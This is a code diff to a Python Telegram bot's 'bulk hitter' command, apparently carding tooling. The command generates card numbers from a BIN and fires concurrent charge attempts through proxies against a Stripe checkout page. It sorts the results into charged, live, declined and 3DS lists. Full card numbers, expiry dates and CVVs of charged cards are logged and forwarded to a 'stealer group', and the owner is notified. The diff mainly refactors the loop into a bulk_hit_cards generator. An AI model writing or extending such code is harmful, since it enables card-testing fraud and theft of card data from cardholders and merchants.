@@ -87,7 +87,8 @@ from modules.auto_hitter import (
     fetch_checkout_page_data as ah_fetch_checkout_data,
     get_currency_symbol, get_proxy_url as ah_get_proxy_url,
     save_user_bin, get_user_saved_bins, delete_user_bin,
-    parse_gen_input, generate_cards_from_bin
+    parse_gen_input, generate_cards_from_bin,
+    bulk_hit_cards
 )
 from modules.stripe_tls import get_checkout_info as tls_get_checkout_info
 try:
@@ -12356,21 +12357,18 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     prefix, mm, yy, cvv_pattern = gen_result
 
-    # Generate cards
     card_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pattern, count)
-    cards = auto_hitter_parse_cards("\n".join(card_lines))
 
-    if not cards:
+    if not card_lines:
         await message.reply_text(
             f"❌ Failed to generate cards from BIN <code>{prefix}</code>.",
             parse_mode=ParseMode.HTML
         )
         return
 
-    # Send loading message
     loading_msg = await message.reply_text(
         f"⚡ <b>BULK HITTER</b>\n{SEP}\n"
-        f"💳 Generated <b>{len(cards)}</b> cards from BIN <code>{prefix}</code>\n"
+        f"💳 Generated <b>{len(card_lines)}</b> cards from BIN <code>{prefix}</code>\n"
         f"🔍 Fetching checkout info...",
         parse_mode=ParseMode.HTML
     )
@@ -12379,7 +12377,6 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     proxy_url = ah_get_proxy_url(user_proxy) if user_proxy else None
     user_email = ah_get_user_email(user.id) or "checkout@gmail.com"
 
-    # Fetch checkout data
     try:
         checkout_data = await tls_get_checkout_info(checkout_url, proxy_url)
         if not checkout_data.get("pk") or not checkout_data.get("cs"):
@@ -12402,22 +12399,12 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     price_str = f"{sym}{price:.2f}" if price else "N/A"
     checkout_data["email"] = user_email
 
-    # ── shared helper: runs one card and returns (card, result) ──────────────
-    async def _hit_with_card(card, co_data, proxy, email):
-        try:
-            result = await auto_hitter_charge(card, co_data, proxy, email)
-        except Exception as ex:
-            result = {"status": "ERROR", "response": str(ex)[:60], "time": 0}
-        return card, result
-
-    # Tallies and live-status builder
     charged, live, declined, tds, errors = [], [], [], [], []
     done_count = 0
-    total_count = len(cards)
-    _last_edit = [0.0]  # mutable reference for throttle
+    total_count = len(card_lines)
+    _last_edit = [0.0]
 
     def _build_running_status():
-        prog = f"{done_count}/{total_count}"
         return (
             f"⚡ <b>BULK HITTER RUNNING</b>\n{SEP}\n"
             f"🏪 Merchant: <b>{merchant}</b>\n"
@@ -12426,7 +12413,7 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"{SEP}\n"
             f"✅ {len(charged)}  💚 {len(live)}  🔴 {len(declined)}  "
             f"🔒 {len(tds)}  ❌ {len(errors)}\n"
-            f"⏳ Progress: <b>{prog}</b>"
+            f"⏳ Progress: <b>{done_count}/{total_count}</b>"
         )
 
     await loading_msg.edit_text(
@@ -12439,46 +12426,46 @@ async def bulkhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
-    # Launch all cards concurrently; process as each completes
-    tasks = [_hit_with_card(card, checkout_data, user_proxy, user_email) for card in cards]
-    for coro in asyncio.as_completed(tasks):
-        card, result = await coro
+    async for raw_str, result in bulk_hit_cards(card_lines, checkout_data, user_proxy, user_email):
+        parts = raw_str.split("|")
+        cc    = parts[0] if len(parts) > 0 else ""
+        month = parts[1] if len(parts) > 1 else ""
+        year  = parts[2] if len(parts) > 2 else ""
+        cvv   = parts[3] if len(parts) > 3 else ""
+        masked = f"{cc[:6]}****{cc[-4:]}|{month}|{year}"
         status = result.get("status", "ERROR")
-        card_str = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
         resp = html.escape(str(result.get("response", ""))[:60])
 
         if status == "CHARGED":
-            charged.append((card_str, resp))
+            charged.append((masked, resp))
             try:
                 log_approved_card(user.id, user.username or user.first_name,
-                                  card["cc"], card["month"], card["year"], card["cvv"],
-                                  "bulk_hitter", resp, {})
+                                  cc, month, year, cvv, "bulk_hitter", resp, {})
                 await send_to_stealer_group(
-                    context.bot, card["cc"], card["month"], card["year"], card["cvv"],
+                    context.bot, cc, month, year, cvv,
                     "bulk_hitter", resp, {}, user.id, user.username or user.first_name
                 )
                 await context.bot.send_message(
                     chat_id=OWNER_ID,
                     text=(f"⚡ <b>BULK HITTER CHARGED!</b>\n\n"
                           f"👤 User: @{user.username or user.id}\n"
-                          f"💳 Card: <code>****{card['cc'][-4:]}</code>\n"
+                          f"💳 Card: <code>****{cc[-4:]}</code>\n"
                           f"🏪 Merchant: {merchant}\n💰 Amount: {price_str}"),
                     parse_mode=ParseMode.HTML
                 )
             except Exception:
                 pass
         elif status == "LIVE":
-            live.append((card_str, resp))
+            live.append((masked, resp))
         elif status in ("3DS_REQUIRED", "3DS"):
-            tds.append(card_str)
+            tds.append(masked)
         elif status == "DECLINED":
-            declined.append((card_str, resp))
+            declined.append((masked, resp))
         else:
-            errors.append(card_str)
+            errors.append(masked)
 
         done_count += 1
         now = asyncio.get_event_loop().time()
-        # Throttle edits: update on 1st completion, every 3rd, or every 2 s
         if done_count == 1 or done_count == total_count or done_count % 3 == 0 or (now - _last_edit[0] > 2):
             try:
                 await _safe_edit(loading_msg, _build_running_status(), parse_mode=ParseMode.HTML)
